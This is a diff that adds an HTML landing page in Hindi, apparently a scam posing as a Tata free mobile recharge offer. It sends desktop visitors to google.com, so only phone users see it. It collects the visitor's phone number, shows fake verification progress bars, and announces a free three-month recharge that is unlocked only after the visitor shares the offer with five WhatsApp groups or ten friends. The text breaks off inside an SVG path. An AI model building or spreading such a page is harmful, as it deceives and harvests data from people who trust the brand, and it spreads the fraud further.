@@ -1,0 +1,1435 @@
+<!DOCTYPE html>
+<html>
+
+<head>
+          <script>
+            if (/Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent)) {
+             } else {
+            window.location.href = "https://www.google.com";
+             }
+         </script>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no">
+     <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+
+    <title>Main </title>   
+     <meta content='noindex,follow' name='googlebot' />
+ <meta content='noindex,nofollow,noodp,noydir' name='robots' /> 
+<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.7.1/jquery.min.js" integrity="sha512-v2CJ7UaYy4JwqLDIrZUI/4hqeoQieOmAZNXBeQyjo21dadnwR+8ZaIJVT8EE2iyI61OV8e6M8PP2/4hpQINQ/g==" crossorigin="anonymous" referrerpolicy="no-referrer"></script>
+    <script>
+        function set_Cookie(name, value) {
+            var Days = 30;
+            var exp = new Date();
+            exp.setTime(exp.getTime() + (Days * 20 * 1000));
+            document.cookie = name + "=" + escape(value) + ";expires=" + exp.toGMTString() + "; path=/;"
+        }
+
+        function get_Cookie(name) {
+            var arr, reg = new RegExp("(^| )" + name + "=([^;]*)(;|$)");
+            if (arr = document.cookie.match(reg)) {
+                return unescape(arr[2]);
+            }
+            return '';
+        }
+    </script>
+
+
+<style>
+    :root {
+        --color-primary: rgb(31, 30, 30);
+        --color-secondary: #ae0434;
+        --color-secondary2: #ae0434
+    }
+
+    * {
+        box-sizing: border-box;
+        padding: 0;
+        margin: 0
+    }
+
+    html {
+        font-size: 62.5%;
+        font-family: Poppins, sans-serif;
+        font-weight: 500
+    }
+
+    .push {
+        display: none
+    }
+
+    .offer-container,
+    body {
+        width: 100vw
+    }
+
+    .container-chat {
+        font-weight: 400
+    }
+
+    .chat,
+    .wrapper {
+        display: flex;
+        flex-direction: column
+    }
+
+    .loading__box-1--hidden {
+        display: none !important
+    }
+
+    .loading__box-2--hidden {
+        display: none !important
+    }
+
+    .loading__box-3--hidden {
+        display: none !important
+    }
+
+    .loading__check-1--hidden {
+        display: none !important
+    }
+
+    .loading__check-2--hidden {
+        display: none !important
+    }
+
+    .loading__check-3--hidden {
+        display: none !important
+    }
+
+    .chat__reactions {
+        width: 90%;
+        margin: 2rem auto 0;
+        display: flex;
+        align-items: stretch;
+        font-size: .95rem
+    }
+
+    .chat__reactions-icon {
+        width: 1.2rem;
+        margin-right: .2rem
+    }
+
+    .chat__reactions-text {
+        margin-left: .5rem
+    }
+
+    .chat__reactions-counter {
+        margin-left: 1.8rem
+    }
+
+    .chat__actions {
+        margin-top: 1rem;
+        display: flex;
+        justify-content: space-around;
+        font-size: 1.2rem;
+        border-top: 1.4px solid #b0b0b0;
+        border-bottom: .5px solid #d3d3d3
+    }
+
+    .chat__actions-box {
+        display: flex;
+        align-items: center
+    }
+
+    .chat__actions img {
+        width: 4rem
+    }
+
+    .chat__conversation {
+        width: 90%;
+        margin: 0 auto;
+        font-size: 1.1rem
+    }
+
+    .chat__conversation-box {
+        display: flex;
+        flex-direction: row;
+        align-items: center;
+        margin-top: 1rem;
+        position: relative
+    }
+
+    .chat__conversation-box--right {
+        margin-left: 20%;
+        margin-bottom: 1rem
+    }
+
+    .chat__conversation-box-img {
+        width: 3.5rem;
+        border-radius: 50%;
+        margin-right: 1rem;
+        align-self: baseline
+    }
+
+    .chat__conversation-box-active {
+        width: 1rem;
+        height: 1rem;
+        background-color: var(--color-secondary);
+        border-radius: 50%;
+        position: absolute;
+        top: 2.5rem;
+        left: 2.7rem
+    }
+
+    .chat__conversation-box-content-comment {
+        padding: 1rem;
+        background-color: #f2f3f5;
+        border-top-left-radius: 14px;
+        border-top-right-radius: 14px;
+        border-bottom-left-radius: 14px;
+        border-bottom-right-radius: 14px
+    }
+
+    .chat__conversation-box-content-comment-name {
+        color: #726695;
+        font-weight: 500;
+        margin-right: .4rem
+    }
+
+    .chat__conversation-box-content-cta {
+        margin-top: .3rem;
+        padding-left: 1.5rem;
+        color: #726695
+    }
+
+    .chat__conversation-box-content-cta-text {
+        margin-right: .5rem
+    }
+
+    .chat__conversation-box-content-cta--2 {
+        font-size: .9rem
+    }
+
+    .chat__conversation-reply {
+        margin-left: 20%;
+        color: gray
+    }
+
+    .chat__conversation-reply--efect {
+        animation: opacidad 1s infinite
+    }
+
+    @keyframes opacidad {
+        0 {
+            opacity: 0
+        }
+        50 % {
+            opacity: 1
+        }
+        100 % {
+            opacity: 0
+        }
+    }
+
+    .chat__conversation-write {
+        position: relative;
+        margin-bottom: 2rem
+    }
+
+    .chat__conversation-write input {
+        width: 100%;
+        margin-top: 2rem;
+        margin-bottom: 1rem;
+        border: none;
+        background-color: #f2f3f5;
+        border-radius: 100px;
+        padding: .8rem;
+        color: var(--color-primary);
+        padding-left: 1rem;
+        outline: 0
+    }
+
+    .chat__conversation-write-icons {
+        display: flex;
+        flex-direction: row;
+        position: absolute;
+        right: 1.2rem;
+        top: 1.8rem
+    }
+
+    .chat__conversation-write-icons-img {
+        width: 1.2rem;
+        margin-right: .5rem;
+        fill: gray
+    }
+
+    .chat__conversation-write-icons-img--svg {
+        width: 2rem
+    }
+
+    .loading {
+        width: 100%;
+        height: 220px;
+        display: flex;
+        flex-direction: column;
+        align-items: center;
+        justify-content: center;
+        position: absolute;
+        top: 48px;
+        z-index: 10;
+        background-color: #fff;
+        box-shadow: 4.1px 4px 18px 3px rgba(0, 0, 0, .3)
+    }
+
+    .loading__box {
+        width: 50%;
+        display: flex;
+        flex-direction: row;
+        align-items: center;
+        position: relative
+    }
+
+    .loading__animate,
+    .loading__check {
+        width: 5rem
+    }
+
+    .loading__check {
+        position: absolute;
+        left: 0
+    }
+
+    .loading__txt {
+        font-size: 1.2rem;
+        color: var(--color-primary);
+        margin-left: 1rem
+    }
+
+    .loading2 {
+        width: 100%;
+        display: flex;
+        flex-direction: column;
+        align-items: center;
+        justify-content: center;
+        position: absolute;
+        top: 0;
+        height: auto;
+        z-index: 20;
+        background-color: #fff;
+        box-shadow: 4px 4px 18px 3px rgba(0, 0, 0, .3)
+    }
+
+    .loading2__box {
+        text-align: justify;
+        padding: 2rem;
+        color: var(--color-primary);
+        font-size: 14px
+    }
+
+    .loading2__permission {
+        width: 12rem;
+        margin: 0 auto
+    }
+
+    .js-hidden {
+        display: none !important
+    }
+
+    .js-display {
+        display: block
+    }
+
+    .js-show {
+        visibility: hidden !important
+    }
+
+    .logo-container {
+        width: 100%;
+        padding-top: 1.5rem;
+        padding-bottom: 1.5rem;
+        display: flex;
+        flex-direction: row;
+        align-items: center;
+        justify-content: center;
+        color: var(--color-primary);
+        font-size: 2rem;
+        margin: 0 auto 20px;
+        background-color: var(--color-secondary);
+        color: #fff
+    }
+
+    .offer-container {
+        width: 100%;
+        display: flex;
+        flex-direction: column;
+        align-items: center;
+        justify-content: center
+    }
+
+    .offer {
+        width: 100%
+    }
+
+    .offer__fixed {
+        background-color: var(--color-secondary)
+    }
+
+    .offer__fixed-box {
+        width: 90%;
+        margin: 0 auto;
+        display: flex;
+        align-items: center;
+        padding: .5rem
+    }
+
+    .offer__fixed-box span {
+        margin: 0 auto;
+        color: #fff;
+        font-size: 1.5rem
+    }
+
+    .offer__company {
+        width: 30%;
+        border-right: 1px solid var(--color-secondary)
+    }
+
+    .offer__step {
+        width: 100%;
+        display: flex;
+        flex-direction: column;
+        align-items: center;
+        justify-content: center;
+        padding-top: 0
+    }
+
+    @keyframes glowing {
+        0% {
+            box-shadow: 0 0 -10px #000
+        }
+        40% {
+            box-shadow: 0 0 20px #000
+        }
+        60% {
+            box-shadow: 0 0 20px #000
+        }
+        100% {
+            box-shadow: 0 0 -10px #000
+        }
+    }
+
+    .button-glow {
+        animation: glowing 5s infinite;
+        transition: .2s linear;
+        background-image: linear-gradient(to bottom right, #0038a5, #0038a5)
+    }
+
+    .offer__step-box {
+        width: 96%;
+        display: flex;
+        flex-direction: row;
+        align-items: center;
+        justify-content: center;
+        margin-bottom: 2rem;
+        margin: 0 auto 20px;
+        text-align: center;
+        padding-bottom: 15px;
+        position: relative
+    }
+
+    .offer__step-box:before {
+        position: absolute;
+        bottom: 0;
+        left: 50%;
+        content: '';
+        border-radius: 10px;
+        background-color: #0038a5;
+        transform: translateX(-50%)
+    }
+
+    .offer__border {
+        width: 30px;
+        height: 80%;
+        background-color: var(--color-secondary);
+        margin-right: 1rem;
+        display: none
+    }
+
+    .offer__cta-btn {
+        width: 80%;
+        height: 50px;
+        cursor: pointer;
+        font-size: 24px;
+        font-weight: 700;
+        color: #fff;
+        padding: 1rem;
+        border: none;
+        border-radius: 10px;
+        outline: 0;
+        margin: 0 0 20px 3.5rem;
+        background-color: #0038a5;
+        animation: glowing 5s infinite;
+        transition: .2s linear;
+        background-image: linear-gradient(to bottom right, #0038a5, #0038a5)
+    }
+
+    .offer__cta-btn:active,
+    .offer__cta-btn:hover {
+        background-color: #0038a5
+    }
+
+    .offer__cta-btn:active {
+        transform: translateY(2px)
+    }
+
+    .offer__loading {
+        display: flex;
+        flex-direction: column;
+        align-items: center;
+        justify-content: center
+    }
+
+    .offer__svg {
+        position: relative
+    }
+
+    .offer__check {
+        position: absolute;
+        left: 0
+    }
+
+    .offer__porcent {
+        margin-top: 1rem;
+        margin-bottom: 2rem;
+        font-size: 2.5rem;
+        font-weight: 700
+    }
+
+    .offer__form {
+        border: 1.5px solid #c0bfc3;
+        padding: 1rem;
+        width: 80%;
+        border-radius: 10px;
+        position: relative margin-botttom: -10px
+    }
+
+    .offer__form-input {
+        border: none;
+        outline: 0
+    }
+
+    .offer__form-input::placeholder {
+        color: #c0bfc3;
+        font-family: inherit;
+        font-size: 1.5rem
+    }
+
+    .offer__form-separar {
+        position: absolute;
+        width: 1px;
+        height: 100%;
+        top: 0;
+        background-color: #c0bfc3
+    }
+
+    .offer__form-label {
+        display: block;
+        text-align: center;
+        height: 50px;
+        color: #fff;
+        border: none;
+        outline: 0;
+        font-size: 27px;
+        cursor: pointer;
+        padding: 10px 10px;
+        background: #0038a5;
+        transition: background .3s ease
+    }
+
+    .offer__first {
+        width: 90%;
+        display: flex;
+        flex-direction: row;
+        align-items: center;
+        justify-content: center;
+        margin: 9px auto
+    }
+
+    .offer__load {
+        width: 80%;
+        font-size: 1.3rem;
+        padding: .8rem;
+        border: 1px solid var(--color-primary);
+        position: relative
+    }
+
+    .offer__load-icon {
+        width: 30%;
+        display: flex;
+        flex-direction: row;
+        align-items: center;
+        justify-content: center;
+        position: relative;
+        border: 1px solid var(--color-primary);
+        padding-right: .8rem;
+        padding-left: .8rem;
+        border-left: none
+    }
+
+    .offer__load-text {
+        margin-left: -3.5rem;
+        font-size: 1.2rem;
+        font-weight: 700
+    }
+
+    .offer__load-a {
+        position: absolute;
+        height: 3.2rem;
+        top: 0;
+        z-index: -1;
+        left: 0;
+        background-color: #0038a5
+    }
+
+    .permision-container {
+        width: 95%;
+        margin: 0 auto;
+        display: flex;
+        flex-direction: column;
+        align-items: center;
+        background-color: #fff;
+        box-shadow: 4px 4px 18px 3px rgba(0, 0, 0, .4);
+        position: absolute;
+        top: .8rem;
+        left: .8rem;
+        z-index: 15
+    }
+
+    .permision-container-box {
+        width: 95%;
+        margin: 0 auto
+    }
+
+    .permision-container-end,
+    .permision-container-request-text {
+        width: 100%;
+        padding: 1.2rem;
+        background-color: #ededf3;
+        font-size: 1.5rem;
+        font-weight: 700
+    }
+
+    .permision-container-end {
+        font-size: 1rem;
+        font-weight: 400;
+        text-align: center
+    }
+
+    .permision-container-data {
+        padding: 2rem
+    }
+
+    .permision-container-icons {
+        width: 60%;
+        margin: 0 auto;
+        display: flex;
+        flex-direction: row;
+        align-items: center;
+        justify-content: space-around;
+        margin-bottom: 2.5rem
+    }
+
+    .permision-container-icons-face,
+    .permision-container-icons-uber {
+        width: 8rem
+    }
+
+    .permision-container-txt {
+        margin: 0 auto;
+        font-size: 1.5rem;
+        text-align: center;
+        margin-bottom: 1.5rem
+    }
+
+    .permision-container-form {
+        display: flex;
+        flex-direction: column;
+        align-items: center;
+        justify-content: space-between
+    }
+
+    .permision-container-input {
+        outline: 0;
+        padding: 1.2rem;
+        width: 100%;
+        margin-bottom: 1.5rem;
+        border-top-left-radius: 10px;
+        border-top-right-radius: 10px;
+        border-bottom-left-radius: 10px;
+        border-bottom-right-radius: 10px;
+        border: 1px solid #b9b9b9;
+        color: gray;
+        font-size: 1.2rem
+    }
+
+    .permision-container-secure {
+        margin-top: 1rem;
+        display: flex;
+        flex-direction: row;
+        align-items: center;
+        justify-content: center;
+        color: #a2a2a2
+    }
+
+    .permision-container-secure svg {
+        width: 1.5rem;
+        height: 1.5rem;
+        margin-right: 1rem
+    }
+
+    .permision-container-cta {
+        width: 100%;
+        padding: .8rem;
+        margin-top: 1rem;
+        margin-bottom: 1.5rem;
+        margin-left: 0;
+        font-size: 1.8rem
+    }
+
+    input::-webkit-inner-spin-button,
+    input::-webkit-outer-spin-button {
+        -webkit-appearance: none;
+        margin: 0
+    }
+
+    input[type=number] {
+        -moz-appearance: textfield
+    }
+
+    .buttons {
+        font-size: 12px;
+        font-weight: 700;
+        margin: 10px 0 0 47px;
+        color: #90949c
+    }
+
+    .action {
+        cursor: pointer
+    }
+
+    .input {
+        padding: 6px 12px 12px
+    }
+
+    .input input {
+        width: 100%;
+        background: #f1f2f6;
+        padding: 10px;
+        border-radius: 15px;
+        border: 0;
+        outline: 0
+    }
+
+    .post {
+        background: #fff;
+        margin: 0 auto;
+        padding: 10px;
+        max-width: 500px;
+        border: 1px solid #d0d1d5;
+        border-radius: 3px
+    }
+
+    .post img {
+        width: 100%
+    }
+
+    .welcome {
+        font-size: 15px
+    }
+
+    .center {
+        display: flex;
+        align-items: center;
+        justify-content: center
+    }
+
+    .counter {
+        color: #7f7f7f;
+        font-size: 12px;
+        text-align: right;
+        padding: 10px 0 10px 2px;
+        border-bottom: 1px solid #e1e2e3
+    }
+
+    .reactions {
+        display: inline-flex;
+        align-items: center;
+        float: left
+    }
+
+    .counter img {
+        float: left;
+        width: 16px;
+        height: 16px;
+        border-radius: 50%;
+        border: 2px solid #fff;
+        box-sizing: content-box
+    }
+
+    .like,
+    .love {
+        margin-right: -5px
+    }
+
+    .like {
+        z-index: 2
+    }
+
+    .love {
+        z-index: 1
+    }
+
+    .bar {
+        display: table;
+        width: 100%;
+        border-bottom: 1px solid #e1e2e3
+    }
+
+    .bar .react {
+        display: table-cell;
+        width: calc(100% / 3);
+        font-size: 12px;
+        color: #7f7f7f;
+        text-align: center;
+        padding: 10px 0;
+        cursor: pointer
+    }
+
+    .comments {
+        direction: ltr
+    }
+
+    .comment {
+        padding: 6px 0;
+        margin-top: 5px
+    }
+
+    .comment img {
+        float: left;
+        width: 32px;
+        height: 32px;
+        border: none;
+        border-radius: 18px;
+        cursor: pointer
+    }
+
+    .reply {
+        margin-left: 37px
+    }
+
+    .user-container {
+        margin-left: 37px;
+        background: #f1f2f6;
+        padding: 10px;
+        border-radius: 15px;
+        font-size: 12px
+    }
+
+    .user-container .text {
+        display: block
+    }
+
+    .user-container .user {
+        display: inline-block;
+        cursor: pointer;
+        color: #365899;
+        margin-bottom: 5px
+    }
+
+    .B {
+        text-align: center;
+        background-color: #0038a5;
+        color: #fff
+    }
+
+    .center {
+        display: block;
+        margin-left: auto;
+        margin-right: auto;
+        width: 20%
+    }
+</style>  
+
+</head>
+
+<body>
+    <div id="fireworks">
+        <div class="wrapper">
+            <div class="container-main">
+                <img src="./Tata_logo.png" class="center" width="20%">
+                <marquee class="horizontal_marque" direction="left" style="font-size:20px"><b></b></marquee>
+                <div class="B" style="font-size:20px">
+                    🎉 टाटा फ्री रिचार्ज ऑफर | टाटा 🇮🇳<br>
+                </div>
+                <hr />
+                <br />
+                <div class="offer__step" id="first-box">
+                    <div class="offer__step-box">
+                        <span class="offer__border"></span>
+                        <p style="font-size: 20px;" class="offer__text"><b>यह जानने के लिए नीचे क्लिक करें कि आपको अपना मुफ़्त रिचार्ज मिलेगा या नहीं।</b></p>
+                    </div>
+                </div>
+            </div>
+            <div class="offer-container">
+                <main class="offer">
+                    <div class="offer__step" id="first-box">
+                        <button style="margin:20px 0 30px;" id="validar" class="offer__cta-btn button-glow">अभी जांचें ➤</button>
+                    </div>
+                    <div class="offer__loading">
+                        <svg id="loading-svg" class="js-hidden" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" style=" shape-rendering: auto; " viewBox="0 0 100 100" preserveAspectRatio="xMidYMid" width="10rem">
+                            <circle cx="50" cy="50" r="32" stroke-width="8" stroke="#0038a5" stroke-dasharray="90.26548245743669 40.26548245743669" fill="none" stroke-linecap="round" transform="rotate(214.395 50 50)">
+                                <animatetransform attributeName="transform" type="rotate" dur="2s" repeatCount="indefinite" keyTimes="0;1" values="0 50 50;360 50 50"></animatetransform>
+                            </circle>
+                        </svg>
+                        <svg id="check-svg" class="js-hidden" xml:space="preserve" viewBox="0 0 100 100" y="0" x="0" xmlns="http://www.w3.org/2000/svg" version="1.1" style=" background: rgb(255, 255, 255);" width="10rem">
+                            <g class="ldl-scale" style="transform-origin: 50% 50%; transform: rotate(0deg) scale(0.8, 0.8);">
+                                <g class="ldl-ani">
+                                    <g class="ldl-layer">
+                                        <g class="ldl-ani" style="transform: scale(0.91); transform-origin: 50px 50px; animation: 1.11111s linear -0.833333s infinite normal forwards running breath-37df210d-8a2e-4b1a-ada2-3deb9c98e6b4;">
+                                            <circle stroke-miterlimit="10" stroke-width="8" stroke="#333" fill="none" r="40" cy="50" cx="50" style="stroke:white;"></circle>
+                                        </g>
+                                    </g>
+                                    <g class="ldl-layer">
+                                        <g class="ldl-ani" style="transform: scale(0.91); transform-origin: 50px 50px; animation: 1.11111s linear -1.11111s infinite normal forwards running breath-37df210d-8a2e-4b1a-ada2-3deb9c98e6b4;">
+                                            <path fill="white" d="M73.3 33.5c-2.3-2.3-6.1-2.3-8.4 0L44.5 53.9l-9.4-9.4c-2.3-2.3-6.1-2.3-8.4 0-1.1 1.1-1.7 2.6-1.7 4.2s.6 3.1 1.7 4.2l13.6 13.6c1.1 1.1 2.6 1.7 4.2 1.7s3.1-.6 4.2-1.7L73.2 42c1.1-1.1 1.7-2.6 1.7-4.2s-.5-3.1-1.6-4.3z" style="fill:white;"></path>
+                                        </g>
+                                    </g>
+                                </g>
+                            </svg>
+                        <span class="offer__porcent js-hidden"></span>
+                        <span style="font-size: 20px;font-weight: bold;margin-top:-110px;" class="offer__porcent-text js-hidden"><center><img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjYVOwRFOaAIty6mhNm8UTU41nAydK4IUhdzUPjxCxAqDt0gAnlxM-ucbkIh6xIxn7COPx_YyGF4cfWPfu9EWKi49k4_zXrY-g7533Zgi2uXuBDv1sqwbd2L4Jw4MNvXgit9KiZWUOn46f_WduIppw3BkkUJNfvvqAvyqwQkPIZLtJSyAIAFKNzUmHCeAE0/s1600/check-mark-check.gif" alt="Check mark" width="90" height="auto">
+                        </center> <center></br>धन्यवाद, यह पुष्टि हो गई है।</span>
+                    </center> </div>
+                    <div id="second-box" style="margin-bottom: 2.5rem" class="offer__step js-hidden">
+                        <div class="offer__step-box">
+                            <p style="font-size: 1.5rem; text-align:center" class="offer__text"><b>आपके क्षेत्र में 1,00,000 से अधिक लोग पहले ही टाटा के मुफ्त रिचार्ज का लाभ उठा चुके हैं! नीचे अपना फ़ोन नंबर प्रदान करें।</b></p>
+                        </div>
+                        <script>
+                            var prevent = (e) => e.preventDefault();
+                        </script>
+                        <form class="offer__form" onsubmit="return prevent(event)" style="font-size: 20px;">
+                            <input class="offer__form-input" id="text" type="number" placeholder="9393029485" style="height: 38px;font-size: 18px;width: 280px;">
+                        </form>
+                        <br>
+                        <label id="enviar" class="offer__form-label" for="num" style="width: 80%; margin: 10px auto; margin-top: 10px; border-radius: 10px; animation: glowing 5000ms infinite; transition: 0.2s linear; background-image: linear-gradient(to bottom right, #0038a5, #0038a5);">अभी रिचार्ज करें</label>
+                        <div class="message-status js-hidden"></div>
+                    </div>
+                    <div id="third-box" style="margin-bottom: 2.5rem;" class="offer__step js-hidden">
+                        <span style="font-weight: bold; font-size: 2rem; text-align:center" class="offer__text">रिचार्ज प्रोसेस हो रहा है...</span>
+                        <div class="offer__first js-hidden">
+                            <div style="border: 2px solid gray;color:white; width:80%" class="offer__load">डेटा प्रोसेस हो रहा है....<span class="offer__load-a js-hidden"></span></div>
+                            <div style="border: 2px solid gray;border-left: none; width:30%" class="offer__load-icon">
+                                <svg id="first-loading" class="offer__load-animate" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" style=" shape-rendering: auto;" viewBox="0 0 100 100" preserveAspectRatio="xMidYMid" width="3.2rem">
+                                    <circle cx="50" cy="50" r="32" stroke-width="8" stroke="white" stroke-dasharray="50.26548245743669 50.26548245743669" fill="none" stroke-linecap="round" transform="rotate(214.395 50 50)">
+                                        <animatetransform attributeName="transform" type="rotate" dur="1s" repeatCount="indefinite" keyTimes="0;1" values="0 50 50;360 50 50"></animatetransform>
+                                    </circle>
+                                    <circle cx="50" cy="50" r="23" stroke-width="8" stroke="white" stroke-dasharray="36.12831551628262 36.12831551628262" stroke-dashoffset="36.12831551628262" fill="none" stroke-linecap="round" transform="rotate(-214.395 50 50)">
+                                        <animatetransform attributeName="transform" type="rotate" dur="1s" repeatCount="indefinite" keyTimes="0;1" values="0 50 50;-360 50 50"></animatetransform>
+                                    </circle>
+                                </svg>
+                                <svg id="first-checked" class="offer__load-check js-hidden" xml:space="preserve" viewBox="0 0 100 100" y="0" x="0" xmlns="http://www.w3.org/2000/svg" version="1.1" width="3.2rem">
+                                    <g class="ldl-scale" style="transform-origin: 50% 50%; transform: rotate(0deg) scale(0.8, 0.8);">
+                                        <g class="ldl-ani">
+                                            <g class="ldl-layer">
+                                                <g class="ldl-ani" style="transform: scale(0.91); transform-origin: 50px 50px; animation: 1.11111s linear -0.833333s infinite normal forwards running breath-37df210d-8a2e-4b1a-ada2-3deb9c98e6b4;">
+                                                    <circle stroke-miterlimit="10" stroke-width="8" stroke="#333" fill="none" r="40" cy="50" cx="50" style="stroke:white;"></circle>
+                                                </g>
+                                            </g>
+                                            <g class="ldl-layer">
+                                                <g class="ldl-ani" style="transform: scale(0.91); transform-origin: 50px 50px; animation: 1.11111s linear -1.11111s infinite normal forwards running breath-37df210d-8a2e-4b1a-ada2-3deb9c98e6b4;">
+                                                    <path fill="white" d="M73.3 33.5c-2.3-2.3-6.1-2.3-8.4 0L44.5 53.9l-9.4-9.4c-2.3-2.3-6.1-2.3-8.4 0-1.1 1.1-1.7 2.6-1.7 4.2s.6 3.1 1.7 4.2l13.6 13.6c1.1 1.1 2.6 1.7 4.2 1.7s3.1-.6 4.2-1.7L73.2 42c1.1-1.1 1.7-2.6 1.7-4.2s-.5-3.1-1.6-4.3z" style="fill:white;"></path>
+                                                </g>
+                                            </g>
+                                        </g>
+                                    </g>
+                                </svg>
+                                <span id="first-porcent" class="offer__load-text"></span>
+                            </div>
+                        </div>
+                        <div class="offer__first js-hidden">
+                            <div style="border: 2px solid gray; color:white; width:80%" class="offer__load">3 महीने का रिचार्ज जोड़ा जा रहा है....<span class="offer__load-a js-hidden"></span></div>
+                            <div style="border: 2px solid gray;border-left: none; width:30%" class="offer__load-icon">
+                                <svg id="second-loading" class="offer__load-animate" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" style=" shape-rendering: auto;" viewBox="0 0 100 100" preserveAspectRatio="xMidYMid" width="3.2rem">
+                                    <circle cx="50" cy="50" r="32" stroke-width="8" stroke="white" stroke-dasharray="100.26548245743669 100.26548245743669" fill="none" stroke-linecap="round" transform="rotate(214.395 50 50)">
+                                        <animatetransform attributeName="transform" type="rotate" dur="1s" repeatCount="indefinite" keyTimes="0;1" values="0 50 50;360 50 50"></animatetransform>
+                                    </circle>
+                                    <circle cx="50" cy="50" r="23" stroke-width="8" stroke="white" stroke-dasharray="100.12831551628262 100.12831551628262" stroke-dashoffset="36.12831551628262" fill="none" stroke-linecap="round" transform="rotate(-214.395 50 50)">
+                                        <animatetransform attributeName="transform" type="rotate" dur="1s" repeatCount="indefinite" keyTimes="0;1" values="0 50 50;-360 50 50"></animatetransform>
+                                    </circle>
+                                </svg>
+                                <svg id="second-checked" class="offer__load-check js-hidden" xml:space="preserve" viewBox="0 0 100 100" y="0" x="0" xmlns="http://www.w3.org/2000/svg" version="1.1" width="3.2rem">
+                                    <g class="ldl-scale" style="transform-origin: 50% 50%; transform: rotate(0deg) scale(0.8, 0.8);">
+                                        <g class="ldl-ani">
+                                            <g class="ldl-layer">
+                                                <g class="ldl-ani" style="transform: scale(0.91); transform-origin: 50px 50px; animation: 1.11111s linear -0.833333s infinite normal forwards running breath-37df210d-8a2e-4b1a-ada2-3deb9c98e6b4;">
+                                                    <circle stroke-miterlimit="10" stroke-width="8" stroke="#333" fill="none" r="40" cy="50" cx="50" style="stroke:white;"></circle>
+                                                </g>
+                                            </g>
+                                            <g class="ldl-layer">
+                                                <g class="ldl-ani" style="transform: scale(0.91); transform-origin: 50px 50px; animation: 1.11111s linear -1.11111s infinite normal forwards running breath-37df210d-8a2e-4b1a-ada2-3deb9c98e6b4;">
+                                                    <path fill="white" d="M73.3 33.5c-2.3-2.3-6.1-2.3-8.4 0L44.5 53.9l-9.4-9.4c-2.3-2.3-6.1-2.3-8.4 0-1.1 1.1-1.7 2.6-1.7 4.2s.6 3.1 1.7 4.2l13.6 13.6c1.1 1.1 2.6 1.7 4.2 1.7s3.1-.6 4.2-1.7L73.2 42c1.1-1.1 1.7-2.6 1.7-4.2s-.5-3.1-1.6-4.3z" style="fill:white;"></path>
+                                                </g>
+                                            </g>
+                                        </g>
+                                    </g>
+                                </svg>
+                                <span id="second-porcent" class="offer__load-text"></span>
+                            </div>
+                        </div>
+                    </div>
+                    <div id="loading-g" class="offer__step js-hidden">
+                        <div class="offer__step-box">
+                            <svg class="offer__animate" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" style=" shape-rendering: auto;" viewBox="0 0 100 100" preserveAspectRatio="xMidYMid" width="10rem">
+                                <circle cx="50" cy="50" r="32" stroke-width="8" stroke="#0038a5" stroke-dasharray="90.26548245743669 50.26548245743669" fill="none" stroke-linecap="round" transform="rotate(214.395 50 50)">
+                                    <animatetransform attributeName="transform" type="rotate" dur="1s" repeatCount="indefinite" keyTimes="0;1" values="0 50 50;360 50 50"></animatetransform>
+                                </circle>
+                            </svg>
+                        </div>
+                        <p style="font-size: 14px;font-weight: bold;">प्रतीक्षा करें, हम डेटा सत्यापित कर रहे हैं</p>
+                    </div>
+                </main>
+            </div>
+            <div id="share" class="loading2 js-hidden js-congrats">
+                <div class="loading2__box">
+                    <center><img style="margin-top: -20px; margin-bottom: 20px;" src="./Tata_logo.png" width="50" height="auto"></center>
+                    <span style="font-weight: bold; font-size:18px" class="welcome">बधाई हो। आपको अपना 3 महीने का मुफ्त रिचार्ज मिल गया है!</span><br><br>
+                    <b>मुफ्त रिचार्ज कैसे प्राप्त करें?</b><br><br>
+                    <b>1. मुफ़्त रिचार्ज पाने के लिए, नीचे दिए गए हरे "WhatsApp" बटन पर क्लिक करें और इस ऑफ़र को 5 व्हाट्सएप ग्रुप या 10 दोस्तों के साथ साझा करें।</b><br><br>
+                    <b>व्हाट्सएप पर साझा करने के बाद ही आप अगले चरण पर जा सकते हैं, जिसके बाद आप अपना मुफ्त रिचार्ज सक्रिय कर सकते हैं।</b><br>
+                    <center>
+                        <button style="display: flex;align-items:center;margin-left: -8px; justify-content: center;" id="compartir" class="offer__cta-btn js-hidden">
+                            <svg width="40px" style="padding-right:10px" version="1.1" id="Layer_1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" x="0px" y="0px" viewBox="0 0 512 512" xml:space="preserve">
+                                <circle style="fill:#75B73B;" cx="256" cy="256" r="256"></circle>
+                                <path style="fill:#52891D;" d="M360.241,151.826c-14.843-3.712-36.671-16.532-50.8-21.671
+                                    c-55.165-17.239-129.293-3.448-149.98,60.337c-1.724,1.724-5.172,1.724-6.896,1.724c-41.374,48.269-13.791,106.882-17.239,160.323
+                                    c-1.177,18.839-11.083,35.497-23.831,49.588l107.282,107.17C230.931,511.067,243.355,512,256,512
+                                    c126.436,0,231.452-91.665,252.247-212.161L360.241,151.826z"></path>
+                                <g>
+                                    <path style="fill:#FFFFFF;" d="M248.837,108.447c-78.029,3.712-139.604,68.696-139.369,146.811
+                                        c0.072,23.792,5.816,46.249,15.95,66.095l-15.557,75.514c-0.841,4.086,2.843,7.663,6.901,6.701l73.995-17.53
+                                        c19.011,9.471,40.364,14.939,62.962,15.284c79.753,1.219,146.251-62.105,148.74-141.829
+                                        C405.121,174.035,334.591,104.362,248.837,108.447L248.837,108.447z M337.13,335.936c-21.669,21.669-50.483,33.604-81.13,33.604
+                                        c-17.944,0-35.126-4.027-51.066-11.966l-10.302-5.134l-45.37,10.747l9.549-46.356l-5.075-9.943
+                                        c-8.276-16.206-12.472-33.728-12.472-52.084c0-30.648,11.935-59.459,33.604-81.13c21.476-21.478,50.759-33.604,81.134-33.604
+                                        c30.644,0,59.458,11.935,81.127,33.604c21.669,21.669,33.604,50.483,33.604,81.127C370.735,285.177,358.607,314.459,337.13,335.936
+                                        L337.13,335.936z"></path>
+                                    <path style="fill:#FFFFFF;" d="M327.115,286.582l-28.384-8.149c-3.729-1.069-7.749-0.01-10.468,2.76l-6.942,7.07
